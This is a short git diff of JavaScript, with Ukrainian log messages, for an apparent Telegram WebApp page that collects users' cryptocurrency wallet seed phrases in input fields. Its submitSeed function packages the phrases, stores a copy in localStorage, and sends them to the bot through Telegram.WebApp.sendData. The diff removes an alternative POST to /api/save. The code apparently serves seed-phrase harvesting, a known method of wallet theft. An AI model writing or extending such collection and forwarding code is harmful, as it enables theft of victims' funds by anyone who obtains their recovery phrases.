@@ -79,6 +79,7 @@ function renderSeedInputs() {
             setTimeout(() => handleBulkSeedInput(e), 50);
         });
     }
+
     console.log(`🆕 Створено ${length} полів для seed-фраз`);
 }
 
@@ -209,22 +210,9 @@ function submitSeed() {
     console.log("📤 Payload:", payload);
     localStorage.setItem("payload_backup", JSON.stringify(payload));
 
-    fetch("/api/save", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-    })
-    .then(res => res.json())
-    .then(data => {
-        console.log("✅ Збережено на сервері:", data);
-    })
-    .catch(err => {
-        console.warn("❌ Помилка при збереженні:", err);
-    });
-
     if (Telegram?.WebApp?.sendData) {
         Telegram.WebApp.sendData(JSON.stringify(payload));
-        console.log("📲 Payload надіслано через Telegram WebApp");
+        console.log("📲 Payload надіслано через Telegram WebApp ✅");
     } else {
         console.warn("❌ Telegram WebApp sendData недоступна");
     }
